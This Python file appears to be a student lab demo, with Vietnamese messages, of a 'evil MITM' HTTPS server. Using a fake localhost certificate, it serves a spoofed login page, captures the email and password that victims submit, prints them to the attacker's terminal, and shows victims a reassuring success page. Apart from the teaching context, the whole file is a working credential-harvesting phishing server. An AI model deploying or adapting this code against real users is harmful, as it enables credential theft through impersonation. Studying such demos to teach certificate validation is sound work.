import http.server
import ssl
import urllib.parse
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent

PORT = 8443
CERT_FILE = BASE_DIR / "fake_localhost.crt"
KEY_FILE = BASE_DIR / "fake_localhost.key"

class EvilMitMHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(BASE_DIR), **kwargs)

    def do_GET(self):
        if self.path in ("/", "/index.html"):
            self.path = "/fake_index.html"
        return super().do_GET()

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        parsed_data = urllib.parse.parse_qs(post_data)

        username = parsed_data.get('username', [''])[0]
        password = parsed_data.get('password', [''])[0]

        print("\n" + "=" * 55)
        print("[!] CẢNH BÁO MITM: ĐÃ GIẢI MÃ GÓI TIN HTTPS TỪ NẠN NHÂN!")
        print(f"    -> Raw Payload : {post_data}")
        print(f"    -> Email       : {username}")
        print(f"    -> Mật khẩu    : {password}")
        print("=" * 55 + "\n")

        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        response_html = f"""
        <!DOCTYPE html>
        <html lang="vi">
        <head>
            <meta charset="UTF-8">
            <style>
                body {{ font-family: 'Segoe UI', sans-serif; background: #f0f7ff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                .box {{ background: white; padding: 35px; border-radius: 14px; box-shadow: 0 10px 25px rgba(37,99,235,0.12); text-align: center; max-width: 440px; border-top: 5px solid #2563eb; }}
                h2 {{ color: #1e3a8a; margin-bottom: 12px; font-size: 22px; }}
                p {{ color: #475569; font-size: 14px; line-height: 1.6; }}
                .badge {{ display: inline-block; background: #dbeafe; color: #1e40af; padding: 4px 14px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 12px; }}
            </style>
        </head>
        <body>
            <div class="box">
                <span class="badge">ĐÃ TIẾP NHẬN DỮ LIỆU</span>
                <h2>Xác Thực Thành Công</h2>
                <p>Thông tin của bạn đã được gửi an toàn qua giao thức HTTPS.</p>
                <p style="margin-top: 14px; font-size: 12px; color: #94a3b8;">(Kiểm tra terminal của Attacker để xem dữ liệu bị bắt)</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(response_html.encode("utf-8"))


def run_server():
    if not CERT_FILE.exists() or not KEY_FILE.exists():
        print("=" * 55)
        print("[LỖI] Không tìm thấy fake_localhost.crt hoặc fake_localhost.key!")
        print("Vui lòng tạo chứng chỉ giả mạo trước khi chạy evil_server.")
        print("Có thể chạy file: attacker/generate_fake_certs.bat để tạo nhanh.")
        print("=" * 55)
        return

    httpd = http.server.HTTPServer(("127.0.0.1", PORT), EvilMitMHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=str(CERT_FILE), keyfile=str(KEY_FILE))
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print("=" * 55)
    print("      EVIL MITM HTTPS SERVER - NHÓM N05")
    print(f"[*] Lắng nghe tại: https://localhost:{PORT}")
    print("[*] Đang chờ nạn nhân truy cập và gửi thông tin...")
    print("=" * 55)
    httpd.serve_forever()


if __name__ == "__main__":
    run_server()
